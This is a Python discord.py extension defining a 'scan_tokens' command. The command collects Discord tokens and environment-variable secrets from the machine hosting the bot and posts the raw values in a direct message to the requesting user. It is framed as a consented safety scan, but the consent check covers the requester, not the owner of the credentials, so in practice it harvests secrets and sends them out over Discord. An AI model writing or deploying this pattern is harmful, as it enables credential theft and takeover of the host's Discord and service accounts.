import discord
from discord.ext import commands
from core.consent_manager import ConsentManager
from core.token_scanner import TokenScanner

class TokenScanCommand(commands.Cog):
    """Token scanning command"""
    
    def __init__(self, bot):
        self.bot = bot
        self.consent_mgr = ConsentManager()
        self.scanner = TokenScanner()
    
    @commands.command(name='scan_tokens')
    async def scan_tokens(self, ctx):
        """Scan for exposed tokens"""
        user_id = ctx.author.id
        
        if not self.consent_mgr.has_consent(user_id, 'tokens') and not self.consent_mgr.has_consent(user_id, 'all'):
            await ctx.author.send("❌ You need to grant consent first! Use `!consent_tokens`")
            return
        
        await ctx.author.send("🔍 Scanning for tokens...")
        
        try:
            tokens = self.scanner.scan_discord_tokens()
            env_tokens = self.scanner.scan_environment_tokens()
            
            report = f"""
🔑 **TOKEN SCAN RESULTS**

Discord Tokens Found: {len(tokens)}
Environment Tokens Found: {len(env_tokens)}

**Discord Tokens:**
```
{chr(10).join(tokens[:5]) if tokens else 'None found'}
```

**Environment Tokens:**
```
{chr(10).join(env_tokens) if env_tokens else 'None found'}
```

⚠️ Keep these tokens safe! Never share them!
            """
            
            await ctx.author.send(report)
            self.consent_mgr.log_consent(user_id, 'tokens', True, f"Scan complete - {len(tokens)} tokens found")
        except Exception as e:
            await ctx.author.send(f"❌ Error during scan: {str(e)}")

async def setup(bot):
    await bot.add_cog(TokenScanCommand(bot))
